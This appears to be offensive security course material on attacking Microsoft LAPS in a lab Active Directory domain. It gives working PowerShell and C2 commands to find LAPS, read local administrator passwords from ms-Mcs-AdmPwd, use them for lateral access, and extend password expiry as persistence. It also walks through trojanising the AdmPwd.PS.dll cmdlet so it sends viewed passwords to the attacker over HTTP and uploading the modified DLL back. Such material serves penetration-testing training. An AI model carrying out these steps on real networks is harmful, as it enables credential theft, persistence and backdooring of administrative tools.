# Local Administrator Password Solution (LAPS)

Organisations often have a build process for physical and virtual machines within their environment.  It's common that everything is built from the same "gold image" to ensure consistency and compliance.  However, these processes can result in every machine having the same password on accounts such as the local administrator.  If one machine and therefore the local administrator password hash is compromised, an attacker may be able to move laterally to every machine in the domain using the same set of credentials.

LAPS is a Microsoft solution for managing the credentials of a local administrator account on every machine, either the default RID 500 or a custom account.  It ensures that the password for each account is different, random, and automatically changed on a defined schedule.  Permission to request and reset the credentials can be delegated, which are also auditable.  Here is a quick summary of how LAPS works:

    The Active Directory schema is extended and adds two new properties to computer objects, called ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime.
    By default, the DACL on ms-Mcs-AdmPwd only grants read access to Domain Admins.  Each computer object is given permission to update these properties on itself.
    Rights to read AdmPwd can be delegated to other principals (users, groups etc), which is typically done at the OU level.
    A new GPO template is installed, which is used to deploy the LAPS configuration to machines (different policies can be applied to different OUs).
    The LAPS client is also installed on every machine (commonly distributed via GPO or a third-party software management solution).
    When a machine performs a gpupdate, it will check the AdmPwdExpirationTime property on its own computer object in AD. If the time has elapsed, it will generate a new password (based on the LAPS policy) and sets it on the ms-Mcs-AdmPwd property.

 

There are a few methods to hunt for the presence of LAPS.  If it's applied to a machine that you have access to, AdmPwd.dll will be on disk.

    run hostname

    ls C:\Program Files\LAPS\CSE

We could also search for GPOs that have "LAPS" or some other descriptive term in the name.

    powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

As well as computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property).

    powershell Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

If we locate the correct GPO, we can download the LAPS configuration from the gpcfilesyspath.

    ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine

    download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol

The Parse-PolFile cmdlet from the GPRegistryPolicyParser package can be used to convert this file into human-readable format.

    PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol

    KeyName     : Software\Policies\Microsoft Services\AdmPwd
    ValueName   : PasswordComplexity
    ValueType   : REG_DWORD
    ValueLength : 4
    ValueData   : 3
    
    KeyName     : Software\Policies\Microsoft Services\AdmPwd
    ValueName   : PasswordLength
    ValueType   : REG_DWORD
    ValueLength : 4
    ValueData   : 14
    
    KeyName     : Software\Policies\Microsoft Services\AdmPwd
    ValueName   : PasswordAgeDays
    ValueType   : REG_DWORD
    ValueLength : 4
    ValueData   : 30
    
    KeyName     : Software\Policies\Microsoft Services\AdmPwd
    ValueName   : AdminAccountName
    ValueType   : REG_SZ
    ValueLength : 20
    ValueData   : LapsAdmin
    
    KeyName     : Software\Policies\Microsoft Services\AdmPwd
    ValueName   : AdmPwdEnabled
    ValueType   : REG_DWORD
    ValueLength : 4
    ValueData   : 1
    
    KeyName     : Software\Policies\Microsoft Services\AdmPwd
    ValueName   : PwdExpirationProtectionEnabled
    ValueType   : REG_DWORD
    ValueLength : 4
    ValueData   : 0

This tells us that:

    Password complexity is upper, lower and numbers.
    Password length is 14.
    Passwords are changed every 30 days.
    The LAPS managed account name is LapsAdmin.
    Password expiration protection is disabled.

# Reading ms-Mcs-AdmPwd

We can discover which principals are allowed to read the ms-Mcs-AdmPwd attribute by reading its DACL on each computer object.

    powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

    powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
    DEV\Developers
    
    powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1108
    DEV\Support Engineers

Dedicated tooling such as the LAPSToolkit also exist.  Find-LAPSDelegatedGroups will query each OU and find domain groups that have delegated read access.

    powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
    powershell Find-LAPSDelegatedGroups
  
Find-AdmPwdExtendedRights goes a little deeper and queries each individual computer for users that have "All Extended Rights".  This will reveal any users that can read the attribute without having had it specifically delegated to them.

To get a computer's password, simply read the attribute.

    getuid

    powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd

The make_token command is an easy way to leverage it.

    make_token .\LapsAdmin 1N3FyjJR5L18za

    ls \\wkstn-1\c$

# Password Expiration Protection

One of the LAPS policy settings is called "Do not allow password expiration time longer than required by policy".  In short, this is the PwdExpirationProtectionEnabled configuration that we read from the Registry.pol file.  When enabled, this policy prevents a user or computer setting the expiration date of a password beyond the password age specified in the PasswordAgeDays setting.  We also read from Registry.pol that this is set to 30 days.  For instance - if a password is set on 1st January 2022, its expiration will be 31st January 2022.  If password expiration protection is enabled and we attempted to modify its expiration date beyond 31st January, it would trigger an automatic reset of that password.

If the policy setting is left "not configured" in the GPO, then password expiration protection is disabled by default.

Since we were able to compromise WKSTN-1 using its LAPS password, we can set its expiration long into the future as a form of persistence.  The expiration date is an 18-digit timestamp calculated as the number of 100-nanosecond intervals that have elapsed since 1st January 1601 (don't ask).

    powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

Where 133101494718702551 is Thursday, 13 October 2022 15:44:31 GMT.

NOTE: https://www.epochconverter.com/ldap can translate between these timestamps and human-readable formats.

If we wanted to push the expiry out by 10 years, we can overwrite this value with 136257686710000000.  Every computer has delegated access to write to this password field, so we must elevate to SYSTEM on WKSTN-1.

    run hostname

    getuid

    powershell Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose

OPSEC: The expiration date will still be visible to admins and a manual reset will change the password and restore the expiration date.

# LAPS Backdoors

There are some techniques that we can leverage to backdoor the LAPS administrative tooling and obtain a copy of passwords when viewed by an admin.  This module will demonstrate this idea using the LAPS PowerShell cmdlet Get-AdmPwdPassword.  If installed on a machine, the LAPS PowerShell modules can be found under C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS.
    
    ls
    [*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

Since PowerShell heavily utilises the .NET Framework, the DLLs here are written in C# which makes them fairly trivial to download, modify and re-upload.  Download AdmPwd.PS.dll and AdmPwd.Utils.dll, sync them to your attacking machine and open AdmPwd.PS.dll with dnSpy.  Use the Assembly Explorer to drill down into the DLL, namespaces and classes until you find the GetPassword method.

![dnspy](https://github.com/user-attachments/assets/63a86918-3d2f-4be5-900f-c53996444109)

This method calls DirectoryUtils.GetPasswordInfo which returns a PasswordInfo object.  You can click on the name and dnSpy will take you to the class definition.  It contains properties for ComputerName, DistinguishedName, Password and ExpirationTimestamp.  The password is simply the plaintext password that is shown to the admin.

Let's modify the code to send the plaintext passwords to us over an HTTP GET request.

OPSEC: This is obviously an irresponsible method to use in the real world, because the plaintext password is being sent unencrypted over the wire.  This is just an example.

Go back to the GetPassword method, right-click somewhere in the main window and select Edit Method.  The first thing we need to do is add a new assembly reference, using the little button at the bottom of the edit window.

![add-reference](https://github.com/user-attachments/assets/7328b0f2-390c-4826-a1a7-100f08b43f6f)

Use the search box to find and add System.Net.

This code will simply instantiate a new WebClient and call the DownloadString method, passing the computer name and password in the URI.

![backdoor](https://github.com/user-attachments/assets/2003bdd9-dc84-497c-bd9d-36673d220baa)

Once the modifications are in place, click the Compile button in the bottom-right of the edit window.  Then select File > Save Module to write the changes to disk.  Upload the DLL back to the target to overwrite the existing file.
    
    upload C:\Users\Attacker\Desktop\AdmPwd.PS.dll

One downside to this tactic is that it will break the digital signature of the DLL, but it will not prevent PowerShell from using it.
